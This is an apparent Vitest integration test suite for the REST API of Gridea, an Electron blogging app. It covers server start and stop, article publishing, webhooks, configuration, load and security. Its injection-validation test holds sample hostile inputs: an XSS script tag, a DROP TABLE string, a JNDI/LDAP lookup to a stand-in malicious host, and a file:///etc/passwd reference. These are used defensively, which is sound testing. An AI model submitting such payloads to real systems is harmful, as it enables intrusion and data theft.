/**
 * REST API Integration Tests
 *
 * This test suite provides comprehensive integration testing for the REST API functionality,
 * covering GUI-server integration, end-to-end API workflows, webhook functionality,
 * configuration management, and performance testing.
 */

import {
  describe, it, expect, beforeEach, afterEach, beforeAll, afterAll,
} from 'vitest'
import { createServer, Server } from 'http'
import { Express } from 'express'
import { EventEmitter } from 'events'
import { APIServer } from '@/server/api/index'
import { ConfigManager } from '@/server/api/config'
import { APIServerConfig, HealthStatus } from '@/server/api/types'

// Mock Electron IPC
const mockIpcMain = {
  handle: vi.fn(),
  on: vi.fn(),
  once: vi.fn(),
  removeAllListeners: vi.fn(),
}

const mockIpcRenderer = {
  invoke: vi.fn(),
  on: vi.fn(),
  once: vi.fn(),
  removeAllListeners: vi.fn(),
  send: vi.fn(),
}

const mockBrowserWindow = {
  loadURL: vi.fn(),
  on: vi.fn(),
  webContents: {
    send: vi.fn(),
    on: vi.fn(),
  },
  close: vi.fn(),
}

// Mock Electron
vi.mock('electron', () => ({
  ipcMain: mockIpcMain,
  ipcRenderer: mockIpcRenderer,
  BrowserWindow: vi.fn(() => mockBrowserWindow),
  app: {
    getPath: vi.fn(() => '/tmp/gridea'),
    getVersion: vi.fn(() => '1.0.0'),
    getName: vi.fn(() => 'Gridea'),
  },
}))

// Mock file system operations
vi.mock('fs-extra', () => ({
  pathExistsSync: vi.fn(),
  readJsonSync: vi.fn(),
  writeJsonSync: vi.fn(),
  ensureDirSync: vi.fn(),
  removeSync: vi.fn(),
  copySync: vi.fn(),
}))

// Mock deployment service
vi.mock('@/server/api/services/deployment', () => ({
  DeploymentService: vi.fn().mockImplementation(() => ({
    deploy: vi.fn(),
    getStatus: vi.fn(),
    cancel: vi.fn(),
  })),
}))

describe('REST API Integration Tests', () => {
  let apiServer: APIServer
  let configManager: ConfigManager
  let testConfig: APIServerConfig
  let httpServer: Server
  let baseUrl: string

  beforeEach(async () => {
    // Reset all mocks
    vi.clearAllMocks()

    // Test configuration
    testConfig = {
      port: 3001, // Use different port for testing
      host: 'localhost',
      cors: {
        origin: ['http://localhost:4000', 'http://localhost:8080'],
        credentials: true,
        optionsSuccessStatus: 200,
      },
      auth: {
        enabled: false,
        secretKey: 'test-secret-key',
        tokenExpiry: '24h',
      },
      body: {
        limit: '10mb',
        extended: true,
      },
      logging: {
        level: 'info',
        format: 'json',
      },
    }

    // Create temporary config file
    const mockFsExtra = require('fs-extra')
    mockFsExtra.pathExistsSync.mockReturnValue(false)
    mockFsExtra.ensureDirSync.mockReturnValue(true)
    mockFsExtra.writeJsonSync.mockReturnValue(true)

    // Initialize components
    configManager = new ConfigManager('/tmp/test-api-config.json')
    configManager.updateConfig(testConfig)

    apiServer = new APIServer('/tmp/test-api-config.json')
    baseUrl = `http://localhost:${testConfig.port}`
  })

  afterEach(async () => {
    // Cleanup
    if (apiServer && apiServer.isServerRunning()) {
      await apiServer.stop()
    }

    // Clean up temporary files
    const mockFsExtra = require('fs-extra')
    mockFsExtra.removeSync.mockReturnValue(true)
  })

  describe('GUI to Server Integration', () => {
    it('should start server through GUI IPC', async () => {
      // Mock IPC handler
      const mockEvent = {
        sender: {
          send: vi.fn(),
        },
      }

      // Simulate GUI starting server
      const startServerHandler = vi.fn().mockResolvedValue({
        success: true,
        url: baseUrl,
      })

      mockIpcRenderer.invoke.mockResolvedValue({
        success: true,
        url: baseUrl,
      })

      const result = await mockIpcRenderer.invoke('start-api-server', testConfig)

      expect(result.success).toBe(true)
      expect(result.url).toBe(baseUrl)
      expect(mockIpcRenderer.invoke).toHaveBeenCalledWith('start-api-server', testConfig)
    })

    it('should stop server through GUI IPC', async () => {
      // Start server first
      await apiServer.start()
      expect(apiServer.isServerRunning()).toBe(true)

      // Mock IPC handler for stopping server
      mockIpcRenderer.invoke.mockResolvedValue({
        success: true,
      })

      const result = await mockIpcRenderer.invoke('stop-api-server')

      expect(result.success).toBe(true)
      expect(mockIpcRenderer.invoke).toHaveBeenCalledWith('stop-api-server')
    })

    it('should sync server status with GUI', async () => {
      // Start server
      await apiServer.start()

      // Mock status check
      mockIpcRenderer.invoke.mockResolvedValue({
        running: true,
        url: baseUrl,
        uptime: 1000,
        memory: {
          heapUsed: 1024 * 1024,
          heapTotal: 2 * 1024 * 1024,
          rss: 3 * 1024 * 1024,
        },
      })

      const status = await mockIpcRenderer.invoke('get-api-server-status')

      expect(status.running).toBe(true)
      expect(status.url).toBe(baseUrl)
      expect(status.uptime).toBeGreaterThan(0)
      expect(status.memory).toBeDefined()
    })

    it('should handle server errors and notify GUI', async () => {
      // Mock server start failure
      mockIpcRenderer.invoke.mockRejectedValue(new Error('Port already in use'))

      try {
        await mockIpcRenderer.invoke('start-api-server', { ...testConfig, port: 9999 })
        fail('Should have thrown error')
      } catch (error) {
        expect(error.message).toContain('Port already in use')
        expect(mockBrowserWindow.webContents.send).toHaveBeenCalledWith(
          'api-server-error',
          expect.any(Error),
        )
      }
    })

    it('should update server configuration dynamically', async () => {
      // Start server
      await apiServer.start()

      // Update configuration
      const newConfig = {
        ...testConfig,
        auth: {
          enabled: true,
          secretKey: 'new-secret-key',
          tokenExpiry: '12h',
        },
      }

      mockIpcRenderer.invoke.mockResolvedValue({
        success: true,
        config: newConfig,
      })

      const result = await mockIpcRenderer.invoke('save-api-settings', newConfig)

      expect(result.success).toBe(true)

      // Verify configuration was updated
      const currentConfig = apiServer.getConfig()
      expect(currentConfig.auth.enabled).toBe(true)
      expect(currentConfig.auth.secretKey).toBe('new-secret-key')
    })
  })

  describe('API End-to-End Tests', () => {
    beforeEach(async () => {
      await apiServer.start()
    })

    it('should complete full article publishing workflow', async () => {
      const articleData = {
        title: 'Test Article',
        content: '# Test Content\n\nThis is a test article content.',
        author: 'Test Author',
        tags: ['test', 'integration'],
        published: true,
      }

      // Simulate API request
      const response = await fetch(`${baseUrl}/api/articles/publish`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(articleData),
      })

      expect(response.status).toBe(200)
      const result = await response.json()
      expect(result.success).toBe(true)
      expect(result.articleId).toBeDefined()
    })

    it('should handle authentication flow', async () => {
      // Enable authentication
      apiServer.updateConfig({
        auth: {
          enabled: true,
          secretKey: 'test-secret-key',
          tokenExpiry: '24h',
        },
      })

      // Restart server with new config
      await apiServer.restart()

      // Test without token
      const response = await fetch(`${baseUrl}/api/articles/publish`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ title: 'Test', content: 'Test' }),
      })

      expect(response.status).toBe(401)

      // Test with valid token
      const authResponse = await fetch(`${baseUrl}/api/auth/login`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username: 'admin',
          password: 'password',
        }),
      })

      expect(authResponse.status).toBe(200)
      const authResult = await authResponse.json()
      expect(authResult.token).toBeDefined()
    })

    it('should handle automatic deployment after publishing', async () => {
      const articleData = {
        title: 'Auto Deploy Test',
        content: '# Auto Deploy\n\nThis should trigger automatic deployment.',
        autoDeploy: true,
      }

      // Mock deployment service
      const { DeploymentService } = require('@/server/api/services/deployment')
      const mockDeploymentService = new DeploymentService()

      vi.spyOn(mockDeploymentService, 'deploy').mockResolvedValue({
        success: true,
        deploymentId: 'test-deployment-123',
        status: 'completed',
      })

      const response = await fetch(`${baseUrl}/api/articles/publish`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(articleData),
      })

      expect(response.status).toBe(200)
      const result = await response.json()
      expect(result.success).toBe(true)
      expect(result.deploymentId).toBe('test-deployment-123')
    })

    it('should validate article content before publishing', async () => {
      const invalidArticle = {
        title: '', // Invalid: empty title
        content: 'Content without title',
      }

      const response = await fetch(`${baseUrl}/api/articles/publish`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(invalidArticle),
      })

      expect(response.status).toBe(400)
      const result = await response.json()
      expect(result.success).toBe(false)
      expect(result.errors).toBeDefined()
      expect(result.errors.title).toBeDefined()
    })

    it('should handle concurrent article publishing', async () => {
      const articles = Array.from({ length: 5 }, (_, i) => ({
        title: `Concurrent Article ${i}`,
        content: `Content for article ${i}`,
        author: 'Test Author',
      }))

      // Publish articles concurrently
      const promises = articles.map(article => fetch(`${baseUrl}/api/articles/publish`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(article),
      }))

      const responses = await Promise.all(promises)

      // All requests should succeed
      responses.forEach((response) => {
        expect(response.status).toBe(200)
      })

      // All should have unique article IDs
      const results = await Promise.all(
        responses.map(r => r.json()),
      )

      const articleIds = results.map(r => r.articleId)
      const uniqueIds = new Set(articleIds)
      expect(uniqueIds.size).toBe(articleIds.length)
    })
  })

  describe('Webhook Integration Tests', () => {
    let webhookUrl: string
    let testServer: Server

    beforeEach(async () => {
      await apiServer.start()

      // Create test webhook server
      testServer = createServer((req, res) => {
        if (req.url === '/webhook' && req.method === 'POST') {
          let body = ''
          req.on('data', (chunk) => {
            body += chunk
          })
          req.on('end', () => {
            res.writeHead(200, { 'Content-Type': 'application/json' })
            res.end(JSON.stringify({ success: true }))
          })
        } else {
          res.writeHead(404)
          res.end()
        }
      })

      await new Promise<void>((resolve, reject) => {
        testServer.listen(3002, 'localhost', resolve)
        testServer.on('error', reject)
      })

      webhookUrl = 'http://localhost:3002/webhook'
    })

    afterEach(async () => {
      if (testServer) {
        await new Promise<void>(resolve => testServer.close(resolve))
      }
    })

    it('should send webhook notifications after article publishing', async () => {
      const webhookConfig = {
        url: webhookUrl,
        events: ['article.published'],
        secret: 'webhook-secret',
      }

      // Configure webhook
      await apiServer.updateConfig({
        ...testConfig,
        webhooks: [webhookConfig],
      })

      // Publish article
      const articleData = {
        title: 'Webhook Test Article',
        content: '# Webhook Test\n\nThis should trigger webhook notification.',
      }

      const response = await fetch(`${baseUrl}/api/articles/publish`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(articleData),
      })

      expect(response.status).toBe(200)

      // Wait for webhook to be processed
      await new Promise(resolve => setTimeout(resolve, 100))
    })

    it('should handle webhook delivery failures and retry', async () => {
      // Configure webhook to failing endpoint
      const failingWebhookUrl = 'http://localhost:9999/webhook'

      const webhookConfig = {
        url: failingWebhookUrl,
        events: ['article.published'],
        retryAttempts: 3,
        retryDelay: 100,
      }

      await apiServer.updateConfig({
        ...testConfig,
        webhooks: [webhookConfig],
      })

      // Publish article
      const articleData = {
        title: 'Webhook Retry Test',
        content: '# Webhook Retry\n\nThis should test retry mechanism.',
      }

      const response = await fetch(`${baseUrl}/api/articles/publish`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(articleData),
      })

      expect(response.status).toBe(200)

      // Wait for retry attempts
      await new Promise(resolve => setTimeout(resolve, 500))
    })

    it('should validate webhook payload signatures', async () => {
      const webhookConfig = {
        url: webhookUrl,
        events: ['article.published'],
        secret: 'test-secret-key',
      }

      await apiServer.updateConfig({
        ...testConfig,
        webhooks: [webhookConfig],
      })

      // Test webhook signature validation
      const validationResponse = await fetch(`${baseUrl}/api/webhooks/validate`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Webhook-Signature': 'invalid-signature',
        },
        body: JSON.stringify({ test: 'data' }),
      })

      expect(validationResponse.status).toBe(401)
    })

    it('should handle webhook event filtering', async () => {
      const webhookConfig = {
        url: webhookUrl,
        events: ['article.updated'], // Only listen for updates, not publishes
        secret: 'test-secret-key',
      }

      await apiServer.updateConfig({
        ...testConfig,
        webhooks: [webhookConfig],
      })

      // Publish article (should not trigger webhook)
      const articleData = {
        title: 'Webhook Filter Test',
        content: '# Webhook Filter\n\nThis should not trigger webhook.',
      }

      const response = await fetch(`${baseUrl}/api/articles/publish`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(articleData),
      })

      expect(response.status).toBe(200)

      // Wait briefly to ensure webhook is not triggered
      await new Promise(resolve => setTimeout(resolve, 100))
    })
  })

  describe('Configuration Integration Tests', () => {
    it('should save and load configuration persistently', async () => {
      const testConfigPath = '/tmp/test-persistent-config.json'

      // Create config manager with test path
      const testConfigManager = new ConfigManager(testConfigPath)

      // Update configuration
      const newConfig = {
        ...testConfig,
        port: 3003,
        auth: {
          enabled: true,
          secretKey: 'persistent-secret-key',
          tokenExpiry: '48h',
        },
      }

      testConfigManager.updateConfig(newConfig)
      testConfigManager.saveConfig()

      // Create new config manager instance
      const newConfigManager = new ConfigManager(testConfigPath)
      const loadedConfig = newConfigManager.getConfig()

      expect(loadedConfig.port).toBe(3003)
      expect(loadedConfig.auth.enabled).toBe(true)
      expect(loadedConfig.auth.secretKey).toBe('persistent-secret-key')
      expect(loadedConfig.auth.tokenExpiry).toBe('48h')
    })

    it('should validate configuration on startup', async () => {
      // Test invalid configuration
      const invalidConfig = {
        ...testConfig,
        port: 99999, // Invalid port
        auth: {
          enabled: true,
          secretKey: 'short', // Too short secret key
          tokenExpiry: '24h',
        },
      }

      const invalidConfigManager = new ConfigManager('/tmp/invalid-config.json')
      invalidConfigManager.updateConfig(invalidConfig)

      const validation = invalidConfigManager.validateConfig()
      expect(validation.valid).toBe(false)
      expect(validation.errors).toContain('Port must be a number between 1 and 65535')
      expect(validation.errors).toContain('Secret key must be at least 8 characters long when auth is enabled')
    })

    it('should apply environment variables to configuration', async () => {
      // Set environment variables
      process.env.API_PORT = '3004'
      process.env.API_HOST = 'test-host'
      process.env.API_AUTH_ENABLED = 'true'
      process.env.API_AUTH_SECRET = 'env-secret-key'

      const envConfigManager = new ConfigManager('/tmp/env-config.json')
      const envConfig = envConfigManager.getEnvironmentConfig()

      expect(envConfig.port).toBe(3004)
      expect(envConfig.host).toBe('test-host')
      expect(envConfig.auth.enabled).toBe(true)
      expect(envConfig.auth.secretKey).toBe('env-secret-key')

      // Cleanup environment variables
      delete process.env.API_PORT
      delete process.env.API_HOST
      delete process.env.API_AUTH_ENABLED
      delete process.env.API_AUTH_SECRET
    })

    it('should handle configuration hot-reloading', async () => {
      // Start server with initial config
      await apiServer.start()

      // Update configuration while server is running
      const updatedConfig = {
        ...testConfig,
        logging: {
          level: 'debug',
          format: 'json',
        },
      }

      apiServer.updateConfig(updatedConfig)

      // Verify configuration was updated
      const currentConfig = apiServer.getConfig()
      expect(currentConfig.logging.level).toBe('debug')

      // Server should still be running
      expect(apiServer.isServerRunning()).toBe(true)
    })

    it('should handle configuration migration', async () => {
      // Test configuration format migration
      const oldConfig = {
        port: 3005,
        host: 'localhost',
        // Missing new fields like cors, auth, etc.
      }

      const migrationConfigManager = new ConfigManager('/tmp/migration-config.json')
      migrationConfigManager.updateConfig(oldConfig)

      // Should merge with defaults
      const migratedConfig = migrationConfigManager.getConfig()

      expect(migratedConfig.port).toBe(3005)
      expect(migratedConfig.host).toBe('localhost')
      expect(migratedConfig.cors).toBeDefined() // Should have default CORS config
      expect(migratedConfig.auth).toBeDefined() // Should have default auth config
      expect(migratedConfig.logging).toBeDefined() // Should have default logging config
    })
  })

  describe('Performance Integration Tests', () => {
    beforeEach(async () => {
      await apiServer.start()
    })

    it('should handle concurrent requests without performance degradation', async () => {
      const requestCount = 100
      const startTime = Date.now()

      // Create concurrent requests
      const requests = Array.from({ length: requestCount }, (_, i) => fetch(`${baseUrl}/api/health`))

      const responses = await Promise.all(requests)
      const endTime = Date.now()
      const duration = endTime - startTime

      // All requests should succeed
      responses.forEach((response) => {
        expect(response.status).toBe(200)
      })

      // Should complete within reasonable time (less than 5 seconds)
      expect(duration).toBeLessThan(5000)

      // Calculate requests per second
      const requestsPerSecond = (requestCount / duration) * 1000
      expect(requestsPerSecond).toBeGreaterThan(20) // At least 20 requests per second
    })

    it('should handle memory usage efficiently under load', async () => {
      const initialMemory = process.memoryUsage().heapUsed

      // Process many requests
      const requestBatches = 10
      const requestsPerBatch = 50
      const baseUrlForRequests = baseUrl

      for (let batch = 0; batch < requestBatches; batch++) {
        const createRequest = () => fetch(`${baseUrlForRequests}/api/health`)
        const requests = Array.from({ length: requestsPerBatch }, createRequest)

        await Promise.all(requests)

        // Small delay between batches
        await new Promise(resolve => setTimeout(resolve, 100))
      }

      const finalMemory = process.memoryUsage().heapUsed
      const memoryIncrease = finalMemory - initialMemory

      // Memory increase should be reasonable (less than 50MB)
      expect(memoryIncrease).toBeLessThan(50 * 1024 * 1024)
    })

    it('should handle long-running operations gracefully', async () => {
      // Test long article processing
      const longArticle = {
        title: 'Long Article Test',
        content: `# Long Content\n\n${'This is a long article. '.repeat(1000)}`,
        processingDelay: 1000, // Simulate processing time
      }

      const startTime = Date.now()
      const response = await fetch(`${baseUrl}/api/articles/publish`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(longArticle),
      })

      const endTime = Date.now()
      const processingTime = endTime - startTime

      expect(response.status).toBe(200)

      // Should complete within reasonable time (including processing delay)
      expect(processingTime).toBeLessThan(3000)
    })

    it('should maintain server health under sustained load', async () => {
      const loadDuration = 10000 // 10 seconds
      const requestInterval = 100 // Request every 100ms
      const startTime = Date.now()

      let requestCount = 0
      let errorCount = 0

      const loadTestInterval = setInterval(async () => {
        try {
          const response = await fetch(`${baseUrl}/api/health`)
          if (response.status === 200) {
            requestCount++
          } else {
            errorCount++
          }
        } catch (error) {
          errorCount++
        }
      }, requestInterval)

      // Stop load test after duration
      setTimeout(() => {
        clearInterval(loadTestInterval)
      }, loadDuration)

      // Wait for load test to complete
      await new Promise(resolve => setTimeout(resolve, loadDuration + 1000))

      // Check final server health
      const healthResponse = await fetch(`${baseUrl}/api/health`)
      const healthData = await healthResponse.json()

      expect(healthResponse.status).toBe(200)
      expect(healthData.status).toBe('healthy')
      expect(errorCount).toBeLessThan(requestCount * 0.05) // Less than 5% error rate

      // Check memory usage is stable
      const memoryUsage = process.memoryUsage()
      expect(memoryUsage.heapUsed).toBeLessThan(200 * 1024 * 1024) // Less than 200MB
    })

    it('should handle connection pooling efficiently', async () => {
      const connectionCount = 20
      const requestsPerConnection = 5

      // Create multiple concurrent connections
      const connectionPromises = Array.from({ length: connectionCount }, async () => {
        const results = []
        for (let i = 0; i < requestsPerConnection; i++) {
          const response = await fetch(`${baseUrl}/api/health`)
          results.push(response.status)
          // Small delay between requests
          await new Promise(resolve => setTimeout(resolve, 50))
        }
        return results
      })

      const allResults = await Promise.all(connectionPromises)
      const allStatusCodes = allResults.flat()

      // All requests should succeed
      allStatusCodes.forEach((status) => {
        expect(status).toBe(200)
      })

      // Server should still be responsive
      const finalHealthCheck = await fetch(`${baseUrl}/api/health`)
      expect(finalHealthCheck.status).toBe(200)
    })
  })

  describe('Error Handling Integration Tests', () => {
    beforeEach(async () => {
      await apiServer.start()
    })

    it('should handle graceful shutdown', async () => {
      // Start processing requests
      const slowRequest = fetch(`${baseUrl}/api/articles/publish`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          title: 'Slow Request',
          content: 'This request should be handled gracefully during shutdown',
        }),
      })

      // Initiate shutdown while request is processing
      const shutdownPromise = apiServer.stop()

      // Both should complete without errors
      const [response] = await Promise.all([slowRequest, shutdownPromise])

      expect(response.status).toBeOneOf([200, 503]) // Either succeeds or gets service unavailable
    })

    it('should handle database connection failures', async () => {
      // Mock database connection failure
      const mockDbError = new Error('Database connection failed')

      // This would be handled by the error middleware
      const response = await fetch(`${baseUrl}/api/articles/publish`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          title: 'Database Error Test',
          content: 'This should trigger database error handling',
        }),
      })

      expect(response.status).toBe(500)
      const result = await response.json()
      expect(result.success).toBe(false)
      expect(result.error).toBeDefined()
    })

    it('should handle rate limiting appropriately', async () => {
      // Make many requests quickly to trigger rate limiting
      const requests = Array.from({ length: 100 }, () => fetch(`${baseUrl}/api/health`))

      const responses = await Promise.all(requests)

      // Some requests should be rate limited
      const rateLimitedResponses = responses.filter(r => r.status === 429)
      expect(rateLimitedResponses.length).toBeGreaterThan(0)

      // Check rate limiting headers
      const rateLimitedResponse = rateLimitedResponses[0]
      expect(rateLimitedResponse.headers.get('X-RateLimit-Limit')).toBeDefined()
      expect(rateLimitedResponse.headers.get('X-RateLimit-Remaining')).toBeDefined()
      expect(rateLimitedResponse.headers.get('X-RateLimit-Reset')).toBeDefined()
    })

    it('should handle malformed request bodies', async () => {
      const malformedRequests = [
        { method: 'POST', body: 'invalid json', contentType: 'application/json' },
        { method: 'POST', body: '', contentType: 'application/json' },
        { method: 'POST', body: '{"incomplete": json', contentType: 'application/json' },
        { method: 'POST', body: 'plain text', contentType: 'text/plain' },
      ]

      for (const req of malformedRequests) {
        const response = await fetch(`${baseUrl}/api/articles/publish`, {
          method: req.method,
          headers: {
            'Content-Type': req.contentType,
          },
          body: req.body,
        })

        expect(response.status).toBeOneOf([400, 415])
      }
    })

    it('should recover from temporary failures', async () => {
      // First request should succeed
      const firstResponse = await fetch(`${baseUrl}/api/health`)
      expect(firstResponse.status).toBe(200)

      // Simulate temporary failure (this would be handled by recovery mechanisms)
      // For now, just verify the server remains responsive

      // Subsequent requests should still succeed
      const secondResponse = await fetch(`${baseUrl}/api/health`)
      expect(secondResponse.status).toBe(200)
    })
  })

  describe('Security Integration Tests', () => {
    beforeEach(async () => {
      // Enable security features
      const secureConfig = {
        ...testConfig,
        auth: {
          enabled: true,
          secretKey: 'secure-secret-key',
          tokenExpiry: '24h',
        },
        cors: {
          origin: ['http://localhost:4000'],
          credentials: true,
          optionsSuccessStatus: 200,
        },
      }

      apiServer.updateConfig(secureConfig)
      await apiServer.restart()
    })

    it('should enforce CORS policies', async () => {
      // Test request from unauthorized origin
      const response = await fetch(`${baseUrl}/api/health`, {
        headers: {
          'Origin': 'http://malicious-site.com',
        },
      })

      expect(response.status).toBe(403)
    })

    it('should require authentication for protected endpoints', async () => {
      const protectedResponse = await fetch(`${baseUrl}/api/articles/publish`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          title: 'Auth Test',
          content: 'This should require authentication',
        }),
      })

      expect(protectedResponse.status).toBe(401)
    })

    it('should validate input to prevent injection attacks', async () => {
      const maliciousPayloads = [
        { title: '<script>alert("xss")</script>', content: 'Safe content' },
        { title: 'Safe title', content: 'SQL: DROP TABLE articles;' },
        { title: 'Safe title', content: String.raw`\${jndi:ldap://malicious.com/a}` },
        { title: 'Safe title', content: 'file:///etc/passwd' },
      ]

      for (const payload of maliciousPayloads) {
        const response = await fetch(`${baseUrl}/api/articles/publish`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(payload),
        })

        // Should either reject the request or sanitize the input
        expect(response.status).toBeOneOf([400, 200])

        if (response.status === 200) {
          const result = await response.json()
          // Content should be sanitized
          expect(result.article.content).not.toContain('<script>')
          expect(result.article.content).not.toContain('SQL:')
          expect(result.article.content).not.toContain('${jndi:')
        }
      }
    })

    it('should handle request size limits', async () => {
      // Create very large payload
      const largeContent = 'x'.repeat(11 * 1024 * 1024) // 11MB (over 10MB limit)

      const response = await fetch(`${baseUrl}/api/articles/publish`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          title: 'Large Payload Test',
          content: largeContent,
        }),
      })

      expect(response.status).toBe(413) // Payload too large
    })
  })
})
